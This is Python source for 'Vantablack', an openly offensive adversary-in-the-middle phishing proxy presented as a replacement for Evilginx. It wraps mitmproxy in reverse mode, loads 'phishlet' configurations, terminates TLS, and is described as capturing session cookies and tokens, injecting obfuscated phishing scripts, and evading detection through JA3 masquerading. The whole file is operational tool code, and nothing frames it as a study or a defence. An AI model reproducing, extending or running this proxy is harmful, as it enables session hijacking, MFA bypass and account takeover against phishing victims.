"""
Vantablack Core v5 - Edge Proxy Service
=======================================

This service replaces Evilginx with a native Python MitM proxy.
It handles:
- Dynamic TLS termination
- Session capture (cookies, tokens)
- Phishing injection (JS/CSS)
- Traffic shaping and evasion
"""

import asyncio
from typing import Optional, Dict, List
import logging
from dataclasses import dataclass
from enum import Enum
try:
    from mitmproxy.tools.dump import DumpMaster
    from mitmproxy import options
    _MITM_AVAILABLE = True
except Exception:
    DumpMaster = None  # type: ignore
    options = None  # type: ignore
    _MITM_AVAILABLE = False
from core.edge.interceptor import VantaInterceptor
from core.edge.phishlets import PhishletLoader
from core.edge.session import SessionManager
from core.common import config

class ProxyMode(str, Enum):
    TRANSPARENT = "transparent"
    REVERSE = "reverse"
    SOCKS5 = "socks5"

@dataclass
class EdgeConfig:
    listen_host: str = "0.0.0.0"
    listen_port: int = 443
    mode: ProxyMode = ProxyMode.REVERSE
    target_host: str = ""
    tls_profile: str = "modern"
    ja3_masquerade: Optional[str] = None
    http2: bool = True
    connection_strategy: str = "lazy"  # eager|lazy
    upstream_http: Optional[str] = None
    
class EdgeProxy:
    """
    Main Edge Proxy Controller.
    Wraps mitmproxy functionality with Vantablack logic.
    """
    
    def __init__(self, config: EdgeConfig):
        self.config = config
        self.logger = logging.getLogger("vantablack.edge")
        self._running = False
        self._master: Optional["DumpMaster"] = None
        self.session_manager = SessionManager()
        self.phishlet_loader = PhishletLoader()
        
    async def start(self, phishlet_yaml: str):
        """Start the proxy service with a specific phishlet"""
        self.logger.info(f"Starting Edge Proxy on {self.config.listen_host}:{self.config.listen_port}")
        if not _MITM_AVAILABLE:
            self.logger.error("mitmproxy not available")
            raise RuntimeError("mitmproxy not installed")
        
        # Load Phishlet
        phishlet = self.phishlet_loader.load_from_yaml(phishlet_yaml)
        
        # Configure mitmproxy options
        upstream_http = self.config.upstream_http or config.get("UPSTREAM_HTTP") or "http://127.0.0.1"
        mode_val = f"reverse:{upstream_http}"
        
        opts = options.Options(
            listen_host=self.config.listen_host,
            listen_port=self.config.listen_port,
            ssl_insecure=True,
            http2=self.config.http2,
            mode=[mode_val]
        )
        # Optional: connection_strategy (not available on all mitmproxy versions)
        try:
            if hasattr(opts, "set"):
                opts.set("connection_strategy", self.config.connection_strategy)
        except Exception:
            pass
        
        self._master = DumpMaster(opts)
        
        # Add Vanta Interceptor
        interceptor = VantaInterceptor(phishlet, self.session_manager)
        self._master.addons.add(interceptor)
        
        self._running = True
        try:
            await self._master.run()
        except Exception as e:
            self.logger.error(f"Proxy runtime error: {e}")
        finally:
            self._running = False
        
    async def stop(self):
        """Stop the proxy service"""
        self.logger.info("Stopping Edge Proxy")
        if self._master:
            self._master.shutdown()
        self._running = False

    def load_phishlet(self, phishlet_path: str):
        """Load a phishlet configuration for interception rules"""
        with open(phishlet_path, 'r') as f:
            return self.phishlet_loader.load_from_yaml(f.read())

    def inject_script(self, flow, script_content: str):
        """Inject obfuscated JS into the response"""
        # Logic moved to Interceptor
        pass
